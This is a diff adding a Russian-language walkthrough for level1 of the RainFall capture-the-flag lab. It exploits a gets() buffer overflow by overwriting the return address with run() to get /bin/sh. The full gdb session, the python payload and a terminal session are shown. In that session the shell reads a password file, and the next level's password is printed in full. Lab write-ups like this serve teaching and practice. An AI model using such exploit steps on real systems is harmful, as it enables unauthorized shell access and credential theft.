@@ -1,0 +1,43 @@
+Список файлов покажет нам исполняемый файл "уровня 1"
+
+Программа ожидает ввода и завершает работу после нажатия клавиши enter
+
+Проанализировав его с помощью gdb, мы увидим, что существует две основные функции: main и run.
+
+Функция запуска использует fwrite для отображения "Хорошо... Чего ждать?\n" в стандартном выходном потоке (stdout). Затем выполните команду оболочки /bin/sh с помощью system.
+Main использует gets для получения пользовательских данных, которые уязвимы для эксплойта переполнения буфера.
+
+Перезаписав значение RET адресом run(), мы можем принудительно выполнить его.
+Давайте попробуем получить смещение eip с помощью генератора шаблонов :
+
+#level1@RainFall:~$ python -c 'print "a" * 80' > /tmp/exploit
+#level1@RainFall:~$ gdb ./level1 
+#(gdb) r < /tmp/exploit
+#Starting program: /home/user/level1/level1 < /tmp/exploit
+#
+#Program received signal SIGSEGV, Segmentation fault.
+#0x61616161 in ?? ()
+#(gdb)
+
+Мы обнаружили смещение в 76. Давайте создадим наш подвиг :
+ввод = заполнение (76 байт) + адрес запуска()
+Адрес функции run(): 0x08048444 
+
+#level1@RainFall:~$ python -c 'print "a" * 76 + "\x44\x84\x04\x08"' > /tmp/exploit
+#level1@RainFall:~$ cat /tmp/exploit | ./level1
+#Good... Wait what?
+#Segmentation fault (core dumped)
+#level1@RainFall:~$
+
+Но поскольку нам нужно выполнить это через pipe, /bin/sh неинтерактивен и автоматически отключится, потому что он попытается прочитать стандартный ввод и увидит EOF. Он существует, потому что это то, что должны делать программы, которые получают EOF на входе.
+У нас есть небольшой трюк с cat, чтобы держать stdin открытым, поэтому /bin/sh будет продолжать прослушивать stdin и выполнять все, что через него передается.
+
+#level1@RainFall:~$ cat /tmp/exploit - | ./level1
+#Good... Wait what?
+#whoami
+#level2
+#cat /home/user/level2/.pass
+#53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
+#^C
+#Segmentation fault (core dumped)
+#level1@RainFall:~$ su level2
